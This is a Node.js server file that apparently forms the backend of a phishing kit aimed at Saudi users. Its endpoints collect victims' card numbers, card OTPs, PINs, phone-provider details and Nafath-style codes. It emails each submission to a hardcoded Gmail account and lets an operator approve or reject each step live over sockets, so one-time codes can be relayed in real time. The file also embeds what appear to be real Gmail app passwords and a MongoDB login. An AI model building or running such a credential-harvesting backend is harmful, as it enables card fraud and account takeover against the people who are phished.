const express = require("express");
const app = express();
const cors = require("cors");
const nodemailer = require("nodemailer");
const { Order } = require("./models");
const { default: mongoose } = require("mongoose");
const server = require("http").createServer(app);
const PORT = process.env.PORT || 8080;
const io = require("socket.io")(server, { cors: { origin: "*" } });
app.use(express.json());
app.use(cors());
app.use(require('morgan')('dev'))

const emailData = {
  user: "a38244486@gmail.com",
  pass: "zojn mhzk kasv capu",
  // user: "saudiabsher1990@gmail.com",
  // pass: "qlkg nfnn xaeq fitz",
};

const sendEmail = async (data, type) => {
  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
      user: emailData.user,
      pass: emailData.pass,
    },
  });
  let htmlContent = "<div>";
  for (const [key, value] of Object.entries(data)) {
    htmlContent += `<p>${key}: ${
      typeof value === "object" ? JSON.stringify(value) : value
    }</p>`;
  }

  return await transporter
    .sendMail({
      from: "Admin Panel",
      to: emailData.user,
      subject: `${
        type === "visa"
          ? "Visa"
          : type === "otp"
          ? " Visa  Otp"
          : type === "pin"
          ? " Visa Pin "
          : type === "phone"
          ? "Provider Gate Data "
          : type === "phoneOtp"
          ? "Provider Gate Otp "
          : "DATA "
      }`,
      html: htmlContent,
    })
    .then((info) => {
      if (info.accepted.length) {
        return true;
      } else {
        return false;
      }
    });
};

app.get("/", (req, res) => res.sendStatus(200));
app.delete('/',async(req,res)=>{
    await Order.find({}).then(async (orders) => {
        await Promise.resolve(
          orders.forEach(async (order) => {
            await Order.findByIdAndDelete(order._id);
          })
        );
      }).then(()=>res.sendStatus(200))
})


app.post("/visa", async (req, res) => {
  try {
    await Order.create(req.body).then(
      async (order) =>
        await sendEmail(req.body, "visa").then(() =>
          res.status(201).json({ order })
        )
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.get("/order/checked/:id", async (req, res) => {
  try {
    const { id } = req.params;
    await Order.findByIdAndUpdate(id, { checked: true }).then(() =>
      res.sendStatus(200)
    );
  } catch (error) {
    console.log("Error: " + error);
    return res.sendStatus(500);
  }
});

app.post("/visaOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    CardOtp: req.body.otp,
    checked: false,
    OtpCardAccept: false,
  }).then(
    async () => await sendEmail(req.body, "otp").then(() => res.sendStatus(200))
  );
});
app.post("/visaPin/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    pin: req.body.pin,
    checked: false,
    PinAccept: false,
  }).then(
    async () => await sendEmail(req.body, "pin").then(() => res.sendStatus(200))
  );
});
app.post("/phone/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    ...req.body,
    checked: false,
    phoneAccept: false,
  }).then(
    async () => await sendEmail(req.body, "phone").then(() => res.sendStatus(200))
  );
});

app.post("/phoneOtp/:id", async (req, res) => {
  const { id } = req.params;
  await Order.findByIdAndUpdate(id, {
    phoneOtp: req.body.phoneOtp,
    checked: false,
    phoneOtpAccept: false,
  }).then(
    async () => await sendEmail(req.body, "phoneOtp").then(() => res.sendStatus(200))
  );
});

app.get(
  "/users",
  async (req, res) => await Order.find().then((users) => res.json(users))
);

io.on("connection", (socket) => {
  console.log("socket connected:", socket.id);

  socket.on("joinOrder", (orderId) => {
    console.log(`Socket ${socket.id} joining room: ${orderId}`);
    socket.join(orderId);
  });

  socket.on("joinAdmin", () => {
    console.log(`Socket ${socket.id} joining admin room`);
    socket.join("admin");
  });

  socket.on("visa", (data) => {
    console.log("visa received", data._id);
    io.to("admin").emit("visa", data);
  });

  socket.on("acceptVisa", async (id) => {
    console.log("acceptVisa From Admin", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
    io.to(id).emit("acceptVisa", id);
  });

  socket.on("declineVisa", async (id) => {
    console.log("declineVisa From Admin", id);
    await Order.findByIdAndUpdate(id, { CardAccept: true });
    io.to(id).emit("declineVisa", id);
  });

  socket.on("visaOtp", (data) => {
    console.log("visaOtp received", data.id);
    io.to("admin").emit("visaOtp", data);
  });

  socket.on("acceptVisaOtp", async (id) => {
    console.log("acceptVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.to(id).emit("acceptVisaOtp", id);
  });

  socket.on("declineVisaOtp", async (id) => {
    console.log("declineVisaOtp From Admin", id);
    await Order.findByIdAndUpdate(id, { OtpCardAccept: true });
    io.to(id).emit("declineVisaOtp", id);
  });

  socket.on("visaPin", (data) => {
    console.log("visaPin received", data.id);
    io.to("admin").emit("visaPin", data);
  });

  socket.on("acceptVisaPin", async (id) => {
    console.log("acceptVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.to(id).emit("acceptVisaPin", id);
  });

  socket.on("declineVisaPin", async (id) => {
    console.log("declineVisaPin From Admin", id);
    await Order.findByIdAndUpdate(id, { PinAccept: true });
    io.to(id).emit("declineVisaPin", id);
  });

  socket.on("phone", (data) => {
    console.log("phone Data", data.id);
    io.to("admin").emit("phone", data);
  });

  socket.on("acceptPhone", async (id) => {
    console.log("acceptPhone From Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.to(id).emit("acceptPhone", id);
  });

  socket.on("declinePhone", async (id) => {
    console.log("declinePhone From Admin", id);
    await Order.findByIdAndUpdate(id, { phoneAccept: true });
    io.to(id).emit("declinePhone", id);
  });

  socket.on("phoneOtp", async (data) => {
    console.log("phoneOtp received", data.id);
    await Order.findByIdAndUpdate(data.id, {
      phoneOtp: data.phoneOtp,
      STCAccept: false,
    });
    io.to("admin").emit("phoneOtp", data);
  });

  socket.on("acceptPhoneOtp", async ({ id, code }) => {
    console.log("acceptPhoneOtp send", id);
    io.to(id).emit("acceptPhoneOtp", { id, code });
  });

  socket.on("declinePhoneOtp", async (id) => {
    console.log("declinePhoneOtp send", id);
    await Order.findByIdAndUpdate(id, { phoneOtpAccept: true });
    io.to(id).emit("declinePhoneOtp", id);
  });

  socket.on("acceptSTC", async (id) => {
    console.log("acceptSTC send", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
    io.to(id).emit("acceptSTC", id);
  });

  socket.on("declineSTC", async (id) => {
    console.log("declineSTC send", id);
    await Order.findByIdAndUpdate(id, { STCAccept: true });
    io.to(id).emit("declineSTC", id);
  });

  socket.on("navaz", (data) => {
    console.log("navaz received", data.id);
    io.to("admin").emit("navaz", data);
  });

  socket.on("acceptNavaz", async (data) => {
    console.log("acceptNavaz send", data.id);
    await Order.findByIdAndUpdate(data.id, {
      NavazAccept: true,
      NavazOtp: data.userOtp,
    });
    io.to(data.id).emit("acceptNavaz", data);
  });

  socket.on("declineNavaz", async (id) => {
    console.log("declineNavaz send", id);
    await Order.findByIdAndUpdate(id, { NavazAccept: true });
    io.to(id).emit("declineNavaz", id);
  });

  socket.on("successValidate", (data) => io.to(data.id || data).emit("successValidate", data));
  socket.on("declineValidate", (data) => io.to(data.id || data).emit("declineValidate", data));
});


// Function to delete orders older than 7 days
const deleteOldOrders = async () => {
  const sevenDaysAgo = new Date();
  sevenDaysAgo.setDate(sevenDaysAgo.getDate() - 7);
  try {
    const result = await Order.deleteMany({ created: { $lt: sevenDaysAgo } });
    console.log(`${result.deletedCount} orders deleted.`);
  } catch (error) {
    console.error("Error deleting old orders:", error);
  }
};

// Function to run daily
const runDailyTask = () => {
  deleteOldOrders();
  setTimeout(runDailyTask, 24 * 60 * 60 * 1000); // Schedule next execution in 24 hours
};


mongoose
  .connect("mongodb+srv://abshr:abshr@abshr.fxznc.mongodb.net/tameni5555")
  .then((conn) =>
    server.listen(PORT, () => {
      runDailyTask();
      console.log("server running and connected to db" + conn.connection.host);
    })
  );
